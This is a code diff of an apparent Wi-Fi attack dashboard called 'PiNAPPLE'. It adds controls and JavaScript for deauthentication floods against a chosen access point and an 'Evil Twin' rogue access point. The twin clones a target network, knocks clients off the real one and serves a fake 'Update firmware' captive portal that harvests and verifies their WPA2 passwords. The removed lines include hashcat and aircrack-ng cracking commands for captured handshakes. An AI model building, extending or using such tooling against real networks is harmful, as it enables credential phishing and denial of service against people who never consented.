+        <label>Burst count: <span id="da-count-label">120</span></label>
+        <input type="range" id="da-count" min="10" max="500" value="120"
                oninput="document.getElementById('da-count-label').textContent=this.value; daUpdateEstimate()"
                style="width:100%;margin-top:8px">
       </div>
@@ -4927,11 +6341,11 @@ def wlan1_page():
     <div class="fr">
       <div class="fg">
         <label>Rate (packets/sec, 1-200)</label>
-        <input id="da-rate" type="number" value="20" min="1" max="200" inputmode="numeric"
+        <input id="da-rate" type="number" value="25" min="1" max="200" inputmode="numeric"
                oninput="daUpdateEstimate()">
       </div>
     </div>
-    <div class="hint" id="da-estimate">64 frames at 20 pps ≈ 3.2 seconds.</div>
+    <div class="hint" id="da-estimate">120 frames at 25 pps ≈ 4.8 seconds.</div>
     <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:16px">
       <button class="btn btn-danger" id="da-burst-btn" onclick="fireDeauth()">&#9889; Send burst</button>
       <button class="btn btn-acc" id="btn-cont-deauth-start" onclick="startContinuousDeauth()">&#9889; Start continuous</button>
@@ -4990,13 +6404,15 @@ def wlan1_page():
     <span style="color:var(--warn);font-size:0.75rem">&#9888; Authorized networks only</span></div>
   <p class="hint" style="margin:-8px 0 10px">Clones the target SSID, channel and security on wlan0 (with its own BSSID) and deauths the real AP so clients reconnect to the twin. Requires the hostapd stack. The phone may briefly disconnect from the PiNAPPLE hotspot.</p>
   <div class="warnbox">Starting the Evil Twin rebuilds wlan0, which serves this dashboard, so this page will lose the network for a few seconds — that is expected. When the twin is up, reconnect to the target SSID and open <code>http://10.0.0.1:8080</code> again.<br><br>
-  <strong>Automatic setup:</strong> starting a twin configures the captive portal, DNS hijack and HTTP redirect itself — no toggles to set. The joining device gets the <em>Router Update</em> page; when the password is submitted, wlan1 associates to the real AP to verify it (about 10 seconds). Wrong → retry page. Correct → saved in Credentials, shown below, and the twin stops 2 s later so the device reconnects to its real network.<br><br>
-  <strong>Saved WPA2 network (iPhone/Android):</strong> a phone will only join a clone whose security matches what it saved. If it refuses the open clone, put any dummy passphrase in the field, let the phone attempt the saved network and crack the captured handshake, or start the twin with the real passphrase so it joins by itself.</div>
+  <strong>Automatic setup:</strong> starting a twin configures the captive portal, DNS hijack and HTTP redirect itself — no toggles to set. Stopping it (or restarting the dashboard) restores your previous portal template and network toggles, so the twin cannot leave the portal hijacking the admin AP. The joining device gets the <em>Update firmware</em> page. When it submits a password, PiNAPPLE checks that single candidate against a saved handshake/PMKID for this BSSID (milliseconds, no radio change); if no capture exists it falls back to a real association on wlan1 (~10 seconds). Wrong → retry page. Correct → saved in Credentials, shown below, and the twin stops 2 s later so the device reconnects to its real network.<br><br>
+  <strong>Saved WPA2 network (iPhone/Android):</strong> a phone will only join a clone whose security matches what it saved. If it refuses the open clone, put any dummy passphrase in the field, let the phone attempt the saved network and capture the handshake, or start the twin with the real passphrase so it joins by itself.</div>
   <div class="status-card" role="status" aria-live="polite" id="et-status-card">
     <span class="dot"></span>
     <div class="sc-copy"><strong id="et-state">Idle</strong><span id="et-sub">No twin running</span></div>
     <span class="sc-meta" id="et-meta"></span>
   </div>
+  <div id="et-preflight" class="hint" style="display:none;margin:0 0 14px;padding:14px;border:1px solid var(--bdr);border-radius:10px;background:var(--card);line-height:1.7"></div>
+  <div id="et-checks" class="hint" style="display:none;margin:0 0 14px;padding:14px;border:1px solid var(--bdr);border-radius:10px;background:var(--card);line-height:1.7"></div>
   <div id="et-capture" class="hint" style="display:none;margin:0 0 14px;padding:14px;border:1px solid var(--bdr);border-radius:10px;background:var(--card);line-height:1.7"></div>
   <div id="et-last" class="hint" style="display:none;margin:0 0 14px;padding:14px;border:1px solid rgba(46,213,115,.4);border-radius:10px;background:var(--card);line-height:1.7"></div>
   <div class="card">
@@ -5014,17 +6430,17 @@ def wlan1_page():
       </div>
       <div class="fg">
         <label>Target BSSID (MAC)</label>
-        <input id="et-bssid" placeholder="Target BSSID (MAC)" style="text-transform:uppercase" autocomplete="off">
+        <input id="et-bssid" placeholder="Target BSSID (MAC)" style="text-transform:uppercase" autocomplete="off" oninput="scheduleTwinPreflight()">
       </div>
     </div>
     <div class="fr" style="margin-top:12px">
       <div class="fg">
         <label>Channel</label>
-        <input id="et-channel" type="number" value="6" min="1" max="14" inputmode="numeric">
+        <input id="et-channel" type="number" value="6" min="1" max="14" inputmode="numeric" oninput="scheduleTwinPreflight()">
       </div>
       <div class="fg">
         <label>WPA2 passphrase (optional)</label>
-        <input id="et-psk" placeholder="Empty = open twin" autocomplete="off">
+        <input id="et-psk" placeholder="Empty = open twin" autocomplete="off" oninput="scheduleTwinPreflight()">
       </div>
     </div>
     <div style="display:flex;gap:8px;margin-top:12px;flex-wrap:wrap">
@@ -5198,7 +6614,7 @@ function showWlan1Tab(tab, updateUrl){
   if(tab === 'deauth' || tab === 'handshake' || tab === 'eviltwin' || tab === 'beacon') updateScanTable(tab);
   if(tab === 'deauth') refreshDeauthJobs();
   if(tab === 'beacon') updateBeaconStatus();
-  if(tab === 'eviltwin') refreshEvilTwinStatus();
+  if(tab === 'eviltwin'){ refreshEvilTwinStatus(); refreshTwinPreflight(); }
   if(tab === 'pmkid') refreshPmkidStatus();
   if(tab === 'probes') refreshProbes();
   if(tab === 'tracker') refreshTracker();
@@ -5264,7 +6680,7 @@ function filterTable(tbodyId, query){
 
 function daUpdateEstimate(){
   const c = parseInt((document.getElementById('da-count') || {}).value, 10) || 0;
-  const r = parseInt((document.getElementById('da-rate') || {}).value, 10) || 20;
+  const r = parseInt((document.getElementById('da-rate') || {}).value, 10) || 25;
   const el = document.getElementById('da-estimate');
   if(el) el.textContent = c + ' frames at ' + r + ' pps \u2248 ' + (c / r).toFixed(1) + ' seconds.';
 }
@@ -5350,9 +6766,9 @@ async function refreshDeauthJobs(){
 async function fireDeauth(){
   const bssid = document.getElementById('da-bssid').value.trim();
   const client = document.getElementById('da-client').value.trim() || 'FF:FF:FF:FF:FF:FF';
-  const count = parseInt(document.getElementById('da-count').value, 10) || 64;
+  const count = parseInt(document.getElementById('da-count').value, 10) || 120;
   const channel = document.getElementById('da-channel').value.trim();
-  const rate = parseInt(document.getElementById('da-rate').value, 10) || 20;
+  const rate = parseInt(document.getElementById('da-rate').value, 10) || 25;
   if(!bssid){ toast('Enter a target BSSID first.', 'warn'); return; }
   if(!confirm('Send ' + count + ' deauth frames to ' + bssid + '?')) return;
 
@@ -5459,6 +6875,68 @@ async function fillEvilTwin(v){
     if(n.ssid) document.getElementById('et-ssid').value = n.ssid;
     document.getElementById('et-channel').value = n.channel || 6;
   }
+  refreshTwinPreflight();
+}
+
+let etPreflightTimer = null;
+let etIsRunning = false;
+let etStarting = false;
+
+function scheduleTwinPreflight(){
+  clearTimeout(etPreflightTimer);
+  etPreflightTimer = setTimeout(refreshTwinPreflight, 350);
+}
+
+function etCheckRow(c, colour){
+  const mark = c.ok ? '\u2713' : '\u2717';
+  return '<div style="margin:2px 0;color:' + (c.ok ? 'var(--grn, #2ed573)' : colour) + '">'
+    + mark + ' <strong>' + esc(c.name) + '</strong>'
+    + (c.detail ? ' <span style="color:var(--dim)">' + esc(c.detail) + '</span>' : '')
+    + '</div>';
+}
+
+async function refreshTwinPreflight(){
+  if(document.visibilityState !== 'visible') return;
+  const bssid = (document.getElementById('et-bssid').value || '').trim();
+  const ssid = (document.getElementById('et-ssid').value || '').trim();
+  const channel = (document.getElementById('et-channel').value || '').trim();
+  const psk = (document.getElementById('et-psk').value || '').trim();
+  const url = '/api/wlan1/evil-twin/preflight?bssid=' + encodeURIComponent(bssid)
+    + '&ssid=' + encodeURIComponent(ssid)
+    + '&channel=' + encodeURIComponent(channel)
+    + '&psk=' + (psk ? '1' : '0');
+  const r = await api(url, 'GET');
+  const box = document.getElementById('et-preflight');
+  if(!box || !r || r.ok === false) return;
+
+  const start = document.getElementById('et-start');
+  if(start && !etIsRunning && !etStarting) start.disabled = !r.can_start;
+
+  if(!bssid){
+    box.style.display = 'block';
+    box.innerHTML = '<strong>Preflight</strong><div style="color:var(--dim)">Choose a 2.4 GHz target from the list to check it before starting.</div>';
+    return;
+  }
+  const t = r.target || {};
+  let html = '<strong>Preflight</strong> &middot; '
+    + esc(t.ssid || t.bssid || '?') + ' &middot; ch ' + esc(t.channel || '?')
+    + (t.encryption ? ' &middot; ' + esc(t.encryption) : '')
+    + (t.band ? ' &middot; ' + esc(t.band) + ' GHz' : '');
+  html += '<div style="margin-top:8px">' + (r.checks || []).map(function(c){
+    return etCheckRow(c, c.blocking ? 'var(--red, #ff4757)' : 'var(--warn, #ffa502)');
+  }).join('') + '</div>';
+  if(r.blockers && r.blockers.length){
+    html += '<div style="margin-top:8px;color:var(--red, #ff4757)"><strong>Cannot start:</strong> '
+      + r.blockers.map(function(c){ return esc(c.name); }).join(', ') + '</div>';
+  } else if(r.can_start){
+    html += '<div style="margin-top:8px;color:var(--grn, #2ed573)"><strong>Ready.</strong> '
+      + (r.offline_verify
+          ? 'A saved capture is available, so password checks are offline and instant.'
+          : 'No capture yet, so password checks will use a live association (~10 s).')
+      + '</div>';
+  }
+  box.innerHTML = html;
+  box.style.display = 'block';
 }
 
 async function startHandshake(){
@@ -5604,36 +7082,65 @@ async function refreshEvilTwinStatus(){
   const r = await api('/api/wlan1/evil-twin/status', 'GET');
   if(!r || r.ok === false) return;
   const running = !!r.running;
-  const starting = !!r.starting && !running;
+  const starting = (!!r.starting && !running) || r.phase === 'starting';
+  const healthy = !!((r.twin || {}).healthy);
   const start = document.getElementById('et-start');
   const stop = document.getElementById('et-stop');
+  etIsRunning = running;
+  etStarting = starting;
   if(start) start.disabled = running || starting;
   if(stop) stop.disabled = !(running || starting);
   if(starting){
     setStatusCard('et-status-card','et-state','et-sub','et-meta','busy','Twin starting',
       'Rebuilding wlan0 as ' + (r.ssid || 'the target') + ' on channel ' + (r.channel || '?') +
       (r.security ? ' (' + r.security + ')' : ''), '');
-  } else if(running){
+  } else if(running && healthy){
     const t = r.twin || {};
-    setStatusCard('et-status-card','et-state','et-sub','et-meta','on','Evil Twin active',
+    setStatusCard('et-status-card','et-state','et-sub','et-meta','on','Evil Twin ready',
       'Cloning ' + (r.ssid || '?') + ' on channel ' + (r.channel || '?') +
       (r.security ? ' (' + r.security + ')' : '') +
-      ' · ' + (t.clients || 0) + ' client(s) · hostapd ' + (t.hostapd ? 'up' : 'DOWN') +
-      (t.deauth_channel ? ' · deauth ch' + t.deauth_channel : '') +
+      ' · ' + (t.clients || 0) + ' client(s) · injection ' +
+      (t.injection && t.injection.ok ? 'OK' : 'NOT verified') +
       ((t.clients || 0) === 0 && t.ap_seconds
         ? ' · reverts in ' + Math.max(0, (t.idle_revert || 120) - t.ap_seconds) + 's if nobody joins'
         : ''), '');
-    const ssidEl=document.getElementById('et-ssid');
-    const bssidEl=document.getElementById('et-bssid');
-    const chEl=document.getElementById('et-channel');
-    if(ssidEl && !ssidEl.value) ssidEl.value=r.ssid||'';
-    if(bssidEl && !bssidEl.value) bssidEl.value=r.bssid||'';
-    if(chEl && r.channel) chEl.value=r.channel;
-    const out = document.getElementById('et-output');
-    if(out){ out.style.display = 'block'; out.textContent = 'Cloning ' + (r.ssid || '?') + ' (' + (r.bssid || '?') + ') ch ' + (r.channel || '?'); }
+  } else if(running){
+    setStatusCard('et-status-card','et-state','et-sub','et-meta','warn','Evil Twin degraded',
+      r.error || 'the AP is up but a health check failed', '');
   } else {
     setStatusCard('et-status-card','et-state','et-sub','et-meta', r.error ? 'err' : '', 'Idle',
       r.error || 'No twin running', '');
+  }
+
+  const checksEl = document.getElementById('et-checks');
+  if(checksEl){
+    const checks = (r.twin || {}).checks || [];
+    if(running && checks.length){
+      checksEl.style.display = 'block';
+      checksEl.innerHTML = '<strong>Live health</strong><div style="margin-top:6px">'
+        + checks.map(function(c){ return etCheckRow(c, 'var(--red, #ff4757)'); }).join('')
+        + '</div>' + ((r.warnings || []).length
+          ? '<div style="margin-top:8px;color:var(--warn, #ffa502)">'
+            + r.warnings.map(function(w){ return '\u26a0 ' + esc(w); }).join('<br>') + '</div>'
+          : '');
+    } else {
+      checksEl.style.display = 'none';
+      checksEl.innerHTML = '';
+    }
+  }
+  const ssidEl = document.getElementById('et-ssid');
+  const bssidEl = document.getElementById('et-bssid');
+  const chEl = document.getElementById('et-channel');
+  if(running){
+    if(ssidEl && !ssidEl.value) ssidEl.value = r.ssid || '';
+    if(bssidEl && !bssidEl.value) bssidEl.value = r.bssid || '';
+    if(chEl && r.channel) chEl.value = r.channel;
+    const out = document.getElementById('et-output');
+    if(out){
+      out.style.display = 'block';
+      out.textContent = 'Cloning ' + (r.ssid || '?') + ' (' + (r.bssid || '?') +
+        ') ch ' + (r.channel || '?');
+    }
   }
   const cap = r.capture || {};
   const last = r.last_psk || {};
@@ -5661,11 +7168,11 @@ async function refreshEvilTwinStatus(){
       capEl.style.display='block';
       let html = 'Handshake capture: <code>'+esc(cap.file)+'</code> &middot; '+Math.round((cap.bytes||0)/1024)+' KB';
       if(cap.hash){
-        html += '<br><strong style="color:var(--grn)">'+cap.hashes+' EAPOL hash line(s)</strong> — ready to crack.';
+        html += '<br><strong style="color:var(--grn)">'+cap.hashes+' hash line(s)</strong> — saved for password verification.';
         html += '<div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:10px">';
         html += '<a class="btn btn-acc" href="/api/wlan1/pcap/'+encodeURIComponent(cap.hash)+'">Download .22000</a>';
         html += '<a class="btn btn-outline" href="/api/wlan1/pcap/'+encodeURIComponent(cap.file)+'">Download .pcap</a>';
-        html += '</div><div style="margin-top:8px">hashcat -m 22000 '+esc(cap.hash)+' wordlist.txt &mdash; or aircrack-ng '+esc(cap.file)+' -w wordlist.txt</div>';
+        html += '</div><div style="margin-top:8px">The portal checks the one password a user types against this capture. No wordlist is used.</div>';
       } else {
         html += '<br>No usable EAPOL pair yet. The twin must be WPA2 (any passphrase) and the device has to attempt the network after the deauth.';
       }
@@ -5693,6 +7200,16 @@ async function startEvilTwin(){
   const psk = (document.getElementById('et-psk').value || '').trim();
   if(!ssid || !bssid){ toast('Enter both the target SSID and BSSID.', 'warn'); return; }
   if(psk && (psk.length < 8 || psk.length > 63)){ toast('The WPA2 passphrase must be 8-63 characters.', 'warn'); return; }
+  const pre = await api('/api/wlan1/evil-twin/preflight?bssid=' + encodeURIComponent(bssid)
+    + '&ssid=' + encodeURIComponent(ssid)
+    + '&channel=' + encodeURIComponent(channel)
+    + '&psk=' + (psk ? '1' : '0'), 'GET');
+  if(pre && pre.ok && pre.can_start === false){
+    const names = (pre.blockers || []).map(function(c){ return c.name; }).join(', ');
+    toast('Cannot start yet: ' + (names || 'preflight failed'), 'error', 9000);
+    refreshTwinPreflight();
+    return;
+  }
   const target = reconLookup(bssid);
   const enc = target && target.encryption;
   if(enc && enc !== 'Open' && !psk){
